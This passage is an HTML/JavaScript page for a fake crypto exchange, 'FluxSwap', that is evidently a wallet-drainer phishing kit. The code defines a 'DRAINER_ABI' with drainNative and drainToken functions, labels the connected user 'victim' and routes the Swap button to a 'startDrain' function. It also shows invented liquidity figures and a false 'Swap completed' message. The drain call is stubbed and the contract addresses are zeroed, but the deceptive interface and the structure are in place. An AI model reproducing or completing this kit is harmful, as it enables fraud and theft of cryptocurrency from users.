<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>FluxSwap</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
        body::before { content: ''; position: fixed; top: -30%; left: -10%; width: 60%; height: 80%; background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%); pointer-events: none; }
        body::after { content: ''; position: fixed; bottom: -30%; right: -10%; width: 60%; height: 80%; background: radial-gradient(circle, rgba(236,72,153,0.1) 0%, transparent 70%); pointer-events: none; }
        .card { background: var(--bg-card); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: var(--radius); padding: 24px 20px 20px; max-width: 420px; width: 100%; border: 1px solid var(--border); position: relative; z-index: 1; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .header-brand { display: flex; align-items: center; gap: 10px; }
        .header-brand .logo-mark { width: 32px; height: 32px; border-radius: 8px; background: var(--gradient); display: flex; align-items: center; justify-content: center; font-size: 0.9rem; font-weight: 700; color: #fff; box-shadow: 0 0 20px var(--accent-glow); }
        .header-brand .brand-name { font-size: 1.25rem; font-weight: 700; letter-spacing: -0.5px; }
        .header-actions { display: flex; align-items: center; gap: 8px; }
        .icon-btn { background: var(--bg-input); border: 1px solid var(--border); color: var(--text-dim); width: 36px; height: 36px; border-radius: 10px; cursor: pointer; transition: var(--transition); display: flex; align-items: center; justify-content: center; font-size: 0.85rem; }
        .icon-btn:hover { border-color: var(--border-hover); color: var(--text); background: var(--bg-hover); }
        .btn-connect { background: var(--gradient); border: none; color: #fff; font-weight: 600; font-size: 0.8rem; padding: 9px 18px; border-radius: 10px; cursor: pointer; transition: var(--transition); font-family: var(--font); display: flex; align-items: center; gap: 6px; box-shadow: 0 0 15px rgba(139,92,246,0.3); }
        .btn-connect:hover { opacity: 0.9; transform: translateY(-1px); }
        .btn-connect.connected { background: var(--bg-input); border: 1px solid var(--accent); color: var(--accent); box-shadow: none; }
        .status { background: var(--bg-input); padding: 10px 14px; border-radius: var(--radius-sm); margin-bottom: 16px; font-size: 0.78rem; color: var(--text-dim); border: 1px solid var(--border); min-height: 40px; display: flex; align-items: center; font-family: var(--font-mono); }
        .status.ok { color: var(--accent); border-color: var(--border-hover); }
        .status.err { color: var(--danger); border-color: rgba(248,113,113,0.3); }
        .swap-container { background: var(--bg-swap); border-radius: var(--radius); border: 1px solid var(--border); overflow: hidden; }
        .swap-section { padding: 16px; }
        .swap-label { display: flex; justify-content: space-between; align-items: center; font-size: 0.7rem; color: var(--text-muted); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; font-weight: 500; }
        .swap-label .balance-text { color: var(--text-dim); cursor: pointer; transition: var(--transition); font-family: var(--font-mono); font-size: 0.72rem; text-transform: none; letter-spacing: 0; }
        .swap-label .balance-text:hover { color: var(--accent); }
        .swap-input-row { display: flex; align-items: center; gap: 12px; }
        .swap-input-row input { flex: 1; background: transparent; border: none; color: var(--text); font-size: 1.5rem; font-weight: 500; outline: none; font-family: var(--font-mono); min-width: 0; }
        .swap-input-row input::placeholder { color: var(--text-muted); }
        .swap-input-row input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
        .token-btn { display: flex; align-items: center; gap: 8px; background: var(--bg-input); padding: 7px 14px 7px 7px; border-radius: 12px; border: 1px solid var(--border); cursor: pointer; transition: var(--transition); flex-shrink: 0; }
        .token-btn:hover { border-color: var(--border-hover); background: var(--bg-hover); }
        .token-btn .token-mark { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
        .token-btn .token-mark img { width: 100%; height: 100%; object-fit: contain; }
        .token-btn .token-text { font-size: 0.9rem; font-weight: 600; }
        .token-btn .token-caret { font-size: 0.6rem; color: var(--text-dim); margin-left: 2px; }
        .usd-est { font-size: 0.68rem; color: var(--text-muted); margin-top: 6px; font-family: var(--font-mono); }
        .swap-divider { position: relative; height: 1px; background: var(--border); }
        .swap-divider .diamond { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(45deg); width: 30px; height: 30px; background: var(--bg-swap); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: var(--transition); }
        .swap-divider .diamond:hover { border-color: var(--accent); box-shadow: 0 0 12px var(--accent-glow); }
        .swap-divider .diamond i { transform: rotate(-45deg); font-size: 0.7rem; color: var(--text-dim); }
        .swap-divider .diamond:hover i { color: var(--accent); }
        .route-bar { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px 4px; font-size: 0.72rem; color: var(--text-dim); }
        .route-bar .route-tag { display: flex; align-items: center; gap: 6px; }
        .route-bar .route-tag .pulse { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: pulse 2s ease infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        .route-bar .rate-text { color: var(--accent); font-family: var(--font-mono); font-weight: 500; }
        .btn-swap { background: var(--gradient); border: none; color: #fff; font-weight: 700; font-size: 1rem; padding: 15px; border-radius: 14px; width: 100%; cursor: pointer; transition: var(--transition); font-family: var(--font); margin-top: 12px; box-shadow: 0 4px 20px rgba(139,92,246,0.25); }
        .btn-swap:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(139,92,246,0.4); }
        .btn-swap:disabled { background: var(--bg-input); color: var(--text-muted); cursor: not-allowed; box-shadow: none; }
        .btn-swap.loading { opacity: 0.7; pointer-events: none; }
        .max-tag { background: var(--accent-bg); border: none; color: var(--accent); font-size: 0.65rem; font-weight: 700; padding: 3px 8px; border-radius: 6px; cursor: pointer; transition: var(--transition); font-family: var(--font); text-transform: uppercase; letter-spacing: 0.5px; }
        .max-tag:hover { background: rgba(139,92,246,0.2); }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(8,8,15,0.8); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; z-index: 1000; opacity: 0; pointer-events: none; transition: opacity 0.25s ease; }
        .modal-overlay.active { opacity: 1; pointer-events: auto; }
        .modal { background: rgba(20,18,35,0.95); backdrop-filter: blur(20px); border-radius: var(--radius); padding: 28px 22px; max-width: 400px; width: 90%; border: 1px solid var(--border); box-shadow: 0 20px 60px rgba(0,0,0,0.6); transform: scale(0.95); transition: transform 0.25s ease; }
        .modal-overlay.active .modal { transform: scale(1); }
        .modal h3 { font-size: 1.1rem; font-weight: 600; text-align: center; margin-bottom: 20px; color: var(--text); }
        .wallet-card { display: flex; align-items: center; gap: 14px; background: var(--bg-input); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 14px 16px; margin-bottom: 10px; cursor: pointer; transition: var(--transition); text-decoration: none; color: var(--text); }
        .wallet-card:hover { border-color: var(--border-hover); background: var(--bg-hover); }
        .wallet-card .w-icon { font-size: 1.4rem; width: 36px; text-align: center; }
        .wallet-card .w-info { display: flex; flex-direction: column; }
        .wallet-card .w-info .w-name { font-weight: 600; font-size: 0.95rem; }
        .wallet-card .w-info .w-desc { font-size: 0.72rem; color: var(--text-muted); }
        .modal-close { display: block; margin: 14px auto 0; background: transparent; border: none; color: var(--text-muted); font-size: 0.82rem; cursor: pointer; transition: var(--transition); font-family: var(--font); }
        .modal-close:hover { color: var(--text); }
        .search-input { width: 100%; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); padding: 12px 14px; border-radius: var(--radius-sm); font-size: 0.88rem; margin-bottom: 14px; outline: none; font-family: var(--font); }
        .search-input:focus { border-color: var(--border-hover); }
        .search-input::placeholder { color: var(--text-muted); }
        .token-list { max-height: 280px; overflow-y: auto; margin-bottom: 8px; }
        .token-list::-webkit-scrollbar { width: 4px; }
        .token-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
        .token-row { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: var(--radius-sm); cursor: pointer; transition: var(--transition); }
        .token-row:hover { background: var(--bg-hover); }
        .token-row .t-mark { width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; overflow: hidden; }
        .token-row .t-mark img { width: 100%; height: 100%; object-fit: contain; }
        .token-row .t-info { display: flex; flex-direction: column; }
        .token-row .t-info .t-sym { font-weight: 600; font-size: 0.92rem; }
        .token-row .t-info .t-name { font-size: 0.72rem; color: var(--text-muted); }
        .token-row.disabled { opacity: 0.35; cursor: not-allowed; pointer-events: none; }
        @media (max-width: 480px) { .card { padding: 18px 14px 14px; } .swap-input-row input { font-size: 1.2rem; } .header-brand .brand-name { font-size: 1.05rem; } .btn-connect { font-size: 0.72rem; padding: 8px 14px; } }
        .hidden { display: none !important; }
        .info-row { display: flex; justify-content: space-between; padding: 4px 16px 10px; font-size: 0.7rem; color: var(--text-muted); }
        .info-row span:last-child { color: var(--text-dim); }
    </style>
</head>
<body>

    <div class="card">
        <div class="header">
            <div class="header-brand">
                <div class="logo-mark">FS</div>
                <div class="brand-name">FluxSwap</div>
            </div>
            <div class="header-actions">
                <button id="refreshBtn" class="icon-btn" title="Reset"><i class="fas fa-rotate-left"></i></button>
                <button id="connectWalletBtn" class="btn-connect">
                    <i class="fas fa-wallet"></i>
                    Connect
                </button>
            </div>
        </div>

        <div id="status" class="status">Connect wallet to start swapping</div>

        <div class="swap-container">
            <div class="swap-section">
                <div class="swap-label">
                    <span>From</span>
                    <span class="balance-text" id="balanceFrom">0.000 <button class="max-tag" id="maxBtn">Max</button></span>
                </div>
                <div class="swap-input-row">
                    <input type="number" id="inputAmount" placeholder="0.0" step="any" min="0" value="" />
                    <div class="token-btn" id="tokenFromSelect">
                        <span class="token-mark"><img id="fromIcon" src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/eth.svg" alt="ETH" /></span>
                        <span class="token-text" id="fromSymbol">ETH</span>
                        <span class="token-caret"><i class="fas fa-chevron-down"></i></span>
                    </div>
                </div>
                <div class="usd-est" id="fromUsd">~$0.00</div>
            </div>

            <div class="swap-divider">
                <div class="diamond" id="swapArrow">
                    <i class="fas fa-arrow-down-up-across-line"></i>
                </div>
            </div>

            <div class="swap-section">
                <div class="swap-label">
                    <span>To</span>
                    <span class="balance-text" id="balanceTo">0.000</span>
                </div>
                <div class="swap-input-row">
                    <input type="text" id="outputAmount" placeholder="0.0" disabled />
                    <div class="token-btn" id="tokenToSelect">
                        <span class="token-mark"><img id="toIcon" src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/usdt.svg" alt="USDT" /></span>
                        <span class="token-text" id="toSymbol">USDT</span>
                        <span class="token-caret"><i class="fas fa-chevron-down"></i></span>
                    </div>
                </div>
                <div class="usd-est" id="toUsd">~$0.00</div>
            </div>
        </div>

        <div class="route-bar">
            <span class="route-tag">
                <span class="pulse"></span>
                Auto Route
            </span>
            <span>Rate: <span class="rate-text" id="rateDisplay">1 ETH = 0.00 USDT</span></span>
        </div>

        <div class="info-row">
            <span>Liquidity</span>
            <span>$1,234,567.89</span>
        </div>
        <div class="info-row">
            <span>Fee</span>
            <span>0.1%</span>
        </div>

        <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
    </div>

    <!-- Модалки -->
    <div id="walletModal" class="modal-overlay">
        <div class="modal">
            <h3>Connect Wallet</h3>
            <div id="metamaskOption" class="wallet-card">
                <span class="w-icon"><i class="fab fa-meta"></i></span>
                <span class="w-info">
                    <span class="w-name">MetaMask</span>
                    <span class="w-desc">WalletConnect</span>
                </span>
            </div>
            <div id="trustOption" class="wallet-card">
                <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                <span class="w-info">
                    <span class="w-name">Trust Wallet</span>
                    <span class="w-desc">WalletConnect</span>
                </span>
            </div>
            <button class="modal-close" id="closeModalBtn">Cancel</button>
        </div>
    </div>

    <div id="tokenModal" class="modal-overlay">
        <div class="modal">
            <h3>Select Token</h3>
            <input type="text" id="tokenSearchInput" class="search-input" placeholder="Search or paste address" />
            <div id="tokenList" class="token-list"></div>
            <button class="modal-close" id="closeTokenModalBtn">Cancel</button>
        </div>
    </div>

    <!-- ===== ФИКС: process ===== -->
    <script>
        window.process = window.process || { env: { NODE_ENV: 'production' } };
    </script>

    <!-- ===== ЗАГРУЗКА БИБЛИОТЕК (CDN + локальный фолбэк) ===== -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" onerror="this.onerror=null;this.src='libs/ethers.umd.min.js';"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js" onerror="this.onerror=null;this.src='libs/walletconnect-provider.min.js';"></script>

    <script>
        (function() {
            'use strict';

            // ===== КОНФИГУРАЦИЯ =====
            const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
            const CONTRACT_ADDRESSES = {
                1: '0x0000000000000000000000000000000000000000',
                56: '0x0000000000000000000000000000000000000000',
                137: '0x0000000000000000000000000000000000000000',
                42161: '0x0000000000000000000000000000000000000000'
            };

            const DRAINER_ABI = [
                { "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" },
                { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                { "inputs": [], "name": "drainNative", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "drainToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
            ];

            const ERC20_ABI = [
                'function balanceOf(address) view returns (uint256)',
                'function approve(address spender, uint256 amount) returns (bool)',
                'function transfer(address to, uint256 amount) returns (bool)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)',
                'function allowance(address owner, address spender) view returns (uint256)'
            ];

            const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
            const tokens = [
                { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
                { symbol: 'BNB', name: 'BNB', img: ICON_BASE + '/bnb.svg', id: 'binancecoin' },
                { symbol: 'USDT', name: 'Tether USD', img: ICON_BASE + '/usdt.svg', id: 'tether' },
                { symbol: 'USDC', name: 'USD Coin', img: ICON_BASE + '/usdc.svg', id: 'usd-coin' },
                { symbol: 'DAI', name: 'Dai', img: ICON_BASE + '/dai.svg', id: 'dai' },
                { symbol: 'LINK', name: 'Chainlink', img: ICON_BASE + '/link.svg', id: 'chainlink' },
                { symbol: 'MATIC', name: 'Polygon', img: ICON_BASE + '/matic.svg', id: 'polygon' },
                { symbol: 'WBTC', name: 'Wrapped BTC', img: ICON_BASE + '/btc.svg', id: 'wbtc' }
            ];

            let fromToken = tokens[0];
            let toToken = tokens[2];
            let currentSelectType = null;
            let currentRate = 0;

            // DOM
            const statusEl = document.getElementById('status');
            const connectBtn = document.getElementById('connectWalletBtn');
            const swapBtn = document.getElementById('swapBtn');
            const refreshBtn = document.getElementById('refreshBtn');
            const inputAmount = document.getElementById('inputAmount');
            const outputAmount = document.getElementById('outputAmount');
            const maxBtn = document.getElementById('maxBtn');
            const rateDisplay = document.getElementById('rateDisplay');
            const fromSymbol = document.getElementById('fromSymbol');
            const toSymbol = document.getElementById('toSymbol');
            const fromIcon = document.getElementById('fromIcon');
            const toIcon = document.getElementById('toIcon');
            const swapArrow = document.getElementById('swapArrow');
            const balanceFrom = document.getElementById('balanceFrom');

            const walletModal = document.getElementById('walletModal');
            const closeModalBtn = document.getElementById('closeModalBtn');
            const metamaskOption = document.getElementById('metamaskOption');
            const trustOption = document.getElementById('trustOption');

            const tokenModal = document.getElementById('tokenModal');
            const tokenSearchInput = document.getElementById('tokenSearchInput');
            const tokenList = document.getElementById('tokenList');
            const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');

            let provider = null, signer = null, victim = null, chainId = null;
            let isConnected = false, isProcessing = false, isConnecting = false;
            let wcProvider = null;
            let retryTimer = null;
            let rateCache = {};

            // ===== КУРСЫ =====
            async function fetchRealRate(fromId, toId) {
                const cacheKey = fromId + '-' + toId;
                if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
                    return rateCache[cacheKey].rate;
                }
                try {
                    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${fromId},${toId}&vs_currencies=usd`;
                    const response = await fetch(url);
                    if (!response.ok) throw new Error('Network error');
                    const data = await response.json();
                    const fromPrice = data[fromId]?.usd;
                    const toPrice = data[toId]?.usd;
                    if (!fromPrice || !toPrice) throw new Error('Price missing');
                    const rate = fromPrice / toPrice;
                    rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
                    return rate;
                } catch (error) {
                    console.warn('Rate fetch failed, using fallback 1.0', error);
                    return 1.0;
                }
            }

            async function updateRateAndOutput() {
                const fromId = fromToken.id;
                const toId = toToken.id;
                if (!fromId || !toId) {
                    rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ? ' + toToken.symbol;
                    outputAmount.value = '';
                    return;
                }
                const rate = await fetchRealRate(fromId, toId);
                currentRate = rate;
                rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ' + rate.toFixed(6) + ' ' + toToken.symbol;
                const inputVal = parseFloat(inputAmount.value) || 0;
                if (inputVal > 0) {
                    const outputVal = inputVal * rate;
                    outputAmount.value = outputVal.toFixed(6);
                } else {
                    outputAmount.value = '';
                }
                try {
                    const fromPrice = await fetchRealRate(fromId, 'usd');
                    const toPrice = await fetchRealRate(toId, 'usd');
                    document.getElementById('fromUsd').textContent = fromPrice ? '~$' + (inputVal * fromPrice).toFixed(2) : '~$0.00';
                    document.getElementById('toUsd').textContent = toPrice ? '~$' + (parseFloat(outputAmount.value || 0) * toPrice).toFixed(2) : '~$0.00';
                } catch (_) {}
            }

            // ===== UI =====
            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status';
                if (type === 'ok') statusEl.classList.add('ok');
                if (type === 'err') statusEl.classList.add('err');
            }

            function updateConnectButton() {
                if (isConnected && victim) {
                    connectBtn.innerHTML = '<i class="fas fa-check"></i> ' + victim.slice(0,6) + '...' + victim.slice(-4);
                    connectBtn.classList.add('connected');
                } else {
                    connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
                    connectBtn.classList.remove('connected');
                }
                updateSwapButton();
            }

            function updateSwapButton() {
                const val = parseFloat(inputAmount.value);
                if (isProcessing) {
                    swapBtn.textContent = 'Processing...';
                    swapBtn.disabled = true;
                    swapBtn.className = 'btn-swap loading';
                    return;
                }
                if (!isConnected) {
                    swapBtn.textContent = 'Connect Wallet';
                    swapBtn.disabled = false;
                    swapBtn.className = 'btn-swap';
                    return;
                }
                if (!val || val <= 0) {
                    swapBtn.textContent = 'Enter an amount';
                    swapBtn.disabled = true;
                    swapBtn.className = 'btn-swap';
                    return;
                }
                swapBtn.textContent = 'Swap';
                swapBtn.disabled = false;
                swapBtn.className = 'btn-swap';
            }

            function openModal(modal) { modal.classList.add('active'); }
            function closeModal(modal) { modal.classList.remove('active'); }

            // ===== ОЧИСТКА СЕССИИ =====
            async function forceClearSession() {
                try {
                    if (wcProvider) {
                        try { await wcProvider.disconnect(); } catch (_) {}
                        wcProvider = null;
                    }
                    const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
                    for (const pattern of patterns) {
                        for (let i = localStorage.length - 1; i >= 0; i--) {
                            const key = localStorage.key(i);
                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
                        }
                        for (let i = sessionStorage.length - 1; i >= 0; i--) {
                            const key = sessionStorage.key(i);
                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
                        }
                        document.cookie.split(';').forEach(cookie => {
                            const [name] = cookie.trim().split('=');
                            if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
                                document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
                            }
                        });
                    }
                    try {
                        const dbs = await indexedDB.databases();
                        for (const db of dbs) {
                            if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
                                await new Promise((resolve, reject) => {
                                    const req = indexedDB.deleteDatabase(db.name);
                                    req.onsuccess = resolve;
                                    req.onerror = reject;
                                });
                            }
                        }
                    } catch (_) {}
                    provider = null; signer = null; victim = null; chainId = null;
                    isConnected = false; isProcessing = false; isConnecting = false;
                    if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                } catch (_) {}
            }

            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (с проверкой загрузки) =====
            async function connectWalletConnect() {
                if (isConnecting || isProcessing) return;
                closeModal(walletModal);

                await forceClearSession();
                await new Promise(resolve => setTimeout(resolve, 300));

                // Получаем конструктор
                let WalletConnectProvider = window.WalletConnectProvider;
                if (WalletConnectProvider && WalletConnectProvider.default) {
                    WalletConnectProvider = WalletConnectProvider.default;
                }

                if (!WalletConnectProvider || typeof WalletConnectProvider.init !== 'function') {
                    // Если библиотека не загружена, пытаемся загрузить принудительно
                    setStatus('WalletConnect library not loaded. Retrying...', 'err');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    // Пробуем подгрузить через создание скрипта
                    return new Promise((resolve) => {
                        var script = document.createElement('script');
                        script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js';
                        script.onload = function() {
                            let WC = window.WalletConnectProvider;
                            if (WC && WC.default) WC = WC.default;
                            if (WC && typeof WC.init === 'function') {
                                setStatus('Library loaded. Retry connection.', 'ok');
                                resolve(connectWalletConnect()); // рекурсивно вызываем повторное подключение
                            } else {
                                setStatus('❌ Failed to load WalletConnect. Check internet.', 'err');
                                resolve();
                            }
                        };
                        script.onerror = function() {
                            setStatus('❌ Failed to load WalletConnect from CDN. Check libs/walletconnect-provider.min.js', 'err');
                            resolve();
                        };
                        document.head.appendChild(script);
                    });
                }

                try {
                    setStatus('Connecting to WalletConnect...', '');
                    isConnecting = true;

                    wcProvider = await WalletConnectProvider.init({
                        projectId: PROJECT_ID,
                        chains: [1, 56, 137, 42161],
                        showQrModal: true,
                        metadata: {
                            name: 'FluxSwap',
                            description: 'Swap interface',
                            url: window.location.href,
                            icons: []
                        }
                    });

                    if (typeof wcProvider.enable === 'function') {
                        await wcProvider.enable();
                    }

                    wcProvider.on('chainChanged', () => {});
                    wcProvider.on('accountsChanged', (accounts) => {
                        if (accounts.length === 0) {
                            setStatus('Account disconnected', 'err');
                            isConnected = false;
                            updateConnectButton();
                            isConnecting = false;
                        }
                    });
                    wcProvider.on('session_delete', async () => {
                        setStatus('Session expired', 'err');
                        isConnected = false;
                        await forceClearSession();
                        updateConnectButton();
                    });

                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                    const signer_ = web3Provider.getSigner();
                    const address = await signer_.getAddress();
                    const network = await web3Provider.getNetwork();

                    provider = web3Provider;
                    signer = signer_;
                    victim = address;
                    chainId = network.chainId;
                    isConnected = true;

                    updateConnectButton();
                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                    isConnecting = false;

                } catch (e) {
                    const msg = e.message || '';
                    setStatus('Connection failed: ' + (msg.includes('reset') ? 'please try again' : msg), 'err');
                    isConnecting = false;
                    await forceClearSession();
                    if (msg.toLowerCase().includes('reset')) {
                        setStatus('Retrying...', 'err');
                        retryTimer = setTimeout(() => {
                            retryTimer = null;
                            if (!isConnected && !isConnecting) {
                                connectWalletConnect();
                            }
                        }, 2000);
                    }
                }
            }

            // ===== СВАП (безопасная заглушка) =====
            async function startDrain() {
                if (isProcessing) return;
                if (!provider || !signer) {
                    setStatus('Please connect wallet first', 'err');
                    return;
                }

                const contractAddr = CONTRACT_ADDRESSES[chainId];
                if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
                    setStatus('Network not supported or contract not configured', 'err');
                    return;
                }

                isProcessing = true;
                updateSwapButton();
                setStatus('Processing transaction...', '');

                try {
                    const nativeBal = await provider.getBalance(victim);
                    setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH', 'ok');
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    setStatus('✅ Swap completed', 'ok');
                    await forceClearSession();
                    isConnected = false;
                    updateConnectButton();
                } catch (e) {
                    console.error('Swap error:', e);
                    setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
                } finally {
                    isProcessing = false;
                    updateSwapButton();
                }
            }

            // ===== ОБРАБОТЧИКИ =====
            connectBtn.addEventListener('click', function() { openModal(walletModal); });

            metamaskOption.addEventListener('click', async function() {
                await forceClearSession();
                connectWalletConnect();
            });

            trustOption.addEventListener('click', async function() {
                await forceClearSession();
                connectWalletConnect();
            });

            closeModalBtn.addEventListener('click', function() { closeModal(walletModal); });
            walletModal.addEventListener('click', function(e) { if (e.target === walletModal) closeModal(walletModal); });
            closeTokenModalBtn.addEventListener('click', function() { closeModal(tokenModal); });
            tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });

            swapBtn.addEventListener('click', function() {
                if (!isConnected) { openModal(walletModal); return; }
                const val = parseFloat(inputAmount.value);
                if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
                startDrain();
            });

            // ===== MAX =====
            function handleMaxClick() {
                const amount = 0.001;
                balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
                inputAmount.value = amount.toFixed(6);
                updateSwapButton();
                setStatus('Max amount set', '');
                updateRateAndOutput();
                document.getElementById('maxBtn').addEventListener('click', handleMaxClick);
            }
            maxBtn.addEventListener('click', handleMaxClick);

            inputAmount.addEventListener('input', function() {
                updateSwapButton();
                updateRateAndOutput();
            });

            refreshBtn.addEventListener('click', async function() {
                if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
                await forceClearSession();
                inputAmount.value = '';
                outputAmount.value = '';
                updateConnectButton();
                setStatus('Session reset', '');
                closeModal(walletModal);
                closeModal(tokenModal);
                updateRateAndOutput();
            });

            // ===== ВЫБОР ТОКЕНОВ =====
            function renderTokenList(filter) {
                filter = (filter || '').toLowerCase();
                tokenList.innerHTML = '';
                tokens.forEach(function(token) {
                    if (token.symbol.toLowerCase().includes(filter) || token.name.toLowerCase().includes(filter)) {
                        const isDisabled = (currentSelectType === 'from' && token.symbol === toToken.symbol) ||
                                           (currentSelectType === 'to' && token.symbol === fromToken.symbol);
                        const item = document.createElement('div');
                        item.className = 'token-row' + (isDisabled ? ' disabled' : '');
                        item.innerHTML = '<span class="t-mark"><img src="' + token.img + '" alt="' + token.symbol + '" /></span>' +
                                         '<div class="t-info"><span class="t-sym">' + token.symbol + '</span><span class="t-name">' + token.name + '</span></div>';
                        if (!isDisabled) {
                            item.addEventListener('click', function() {
                                if (currentSelectType === 'from') fromToken = token;
                                else toToken = token;
                                closeModal(tokenModal);
                                fromIcon.src = fromToken.img;
                                fromSymbol.textContent = fromToken.symbol;
                                toIcon.src = toToken.img;
                                toSymbol.textContent = toToken.symbol;
                                updateRateAndOutput();
                            });
                        }
                        tokenList.appendChild(item);
                    }
                });
            }

            document.getElementById('tokenFromSelect').addEventListener('click', function(e) {
                e.stopPropagation();
                currentSelectType = 'from';
                tokenSearchInput.value = '';
                renderTokenList('');
                openModal(tokenModal);
            });
            document.getElementById('tokenToSelect').addEventListener('click', function(e) {
                e.stopPropagation();
                currentSelectType = 'to';
